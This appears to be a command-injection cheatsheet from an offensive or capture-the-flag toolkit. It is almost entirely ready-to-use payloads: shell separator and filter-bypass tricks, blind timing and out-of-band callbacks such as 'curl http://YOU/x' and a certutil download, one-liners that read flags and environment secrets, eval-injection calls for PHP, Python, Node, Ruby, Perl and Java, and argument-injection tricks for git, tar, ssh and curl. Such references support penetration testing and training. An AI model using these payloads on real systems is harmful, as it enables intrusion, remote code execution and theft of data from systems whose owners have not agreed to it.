# Cheatsheet — the field manual

## The separator table — which byte does what

| Byte | POSIX | cmd | PS | Notes |
|---|---|---|---|---|
| `;` | ✓ | — | — | run regardless |
| `&` | ✓ | ✓ | — | bg vs next |
| `&&` | ✓ | ✓ | — | run if ok |
| `\|\|` | ✓ | ✓ | ✓ | run if fail |
| `\|` | ✓ | ✓ | ✓ | pipe stdout |
| `\n` `%0a` | ✓ | — | ✓ | survives ;-filter |
| `` ` `` | ✓ | — | — | substitution |
| `$( )` | ✓ | — | ✓ | substitution |
| `<( )` `>( )` | ✓ | — | — | process sub |
| `> >> < 2>` | ✓ | ✓ | ✓ | redirect |
| `#{`/`${`/`{{` | — | — | — | interp — eval-injection |

## The fingerprint table — which shell ran

| Response contains | Shell |
|---|---|
| `uid=N(user) gid=N` | POSIX sh/bash |
| `nt authority\` `WIN-` | cmd.exe / PS |
| `Microsoft Windows` `Volume` | cmd.exe |
| `Directory: ` `Mode` `Length` | PowerShell `dir` |
| `Linux`/`Darwin` `GNU` | POSIX `uname` |
| `0x…`/`49` computed | evaluator — `eval-injection.md` |

## The blind-channel table

| Channel | Payload |
|---|---|
| timing | `x;sleep 5` / `x&timeout 5` / `x\|sleep 5` |
| error | `x;$(cat /flag)` — the not-found error echoes content |
| OOB | `x;curl http://YOU/x` / `x;nslookup x.YOU` / `x&certutil -urlcache -split -f http://YOU/x %T%\\x` |
| file-write | `x;echo x>/tmp/o` then `?f=/tmp/o` |
| boolean | `x;sleep $( [ -f /flag ] && echo 5 )` |

## The read-the-flag one-liners

```
cat /flag /flag.txt flag* 2>/dev/null
find / -name '*flag*' -type f 2>/dev/null|head
env|grep -i flag; cat /proc/self/environ
ls -la / /app /var/www /root /home /tmp
grep -r 'flag{' /app /var/www 2>/dev/null|head
sudo -l; find / -perm -4000 2>/dev/null; getcap -r /
```

## The filter-bypass ladder

| Blocked | Bypass |
|---|---|
| space | `${IFS}` `$IFS$9` `%09` `{cmd,arg}` `<` |
| `;` | `%0a` `\|` `&&` `$()` `` ` `` `>` |
| letters | `~` complement const, octal `\145`, `$(tr)` |
| keyword | `c'a't` `c$@at` `/???/c?t` `$(echo Y2F0\|base64 -d)` |
| `/` | `${HOME:0:1}` `${PWD:0:1}` `. ./f` `cd` |
| `.` | `f*l*g*` glob, hex-escape in `S:`/`base64` |

## The windows/cmd side

```
x&whoami              — id equivalent
x&hostname            — host name
x&ipconfig            — network
x&type c:\flag.txt    — cat equivalent
x&dir c:\             — ls
x&powershell -c id    — PS
x&powershell -enc <b64> — b64 payload
x&certutil -urlcache -split -f http://YOU/x %TEMP%\x — download
```

## The language-eval one-liners — `eval-injection.md`

```
php:  system('id') passthru('id') shell_exec('id') `id` exec('id')
py:   __import__('os').system('id')  exec('import os;os.system("id")')
      eval('__import__("os").popen("id").read()')
node: require('child_process').execSync('id').toString()
      process.mainModule.require('child_process').execSync('id')
ruby: `id` system('id') exec('id') %x{id} IO.popen('id').read
perl: `id` system('id') exec('id') qx{id} open(F,'id|')
java: Runtime.getRuntime().exec('id')
      new ProcessBuilder('sh','-c','id').start()
```

## The arg-injection quick table — `argument-injection.md`

```
git fetch --upload-pack='id'
tar --checkpoint-action=exec='id'
find . -exec sh -c id \;
curl -o /tmp/x http://YOU/x
wget -O /tmp/x http://YOU/x
ssh -oProxyCommand='id'
dig -f /etc/passwd
nmap --script=x
```

## The evidence template

```
python3 tools/web/cmdi_probe.py --url U --param P --value 'x;id'
# response has uid= →
python3 tools/hooks.py post-probe <n> --hypothesis-id <id> \
  --class command-injection --verdict confirms \
  --evidence-kind class --evidence 'uid=33(www-data)' \
  --response '<verbatim response bytes>'
```
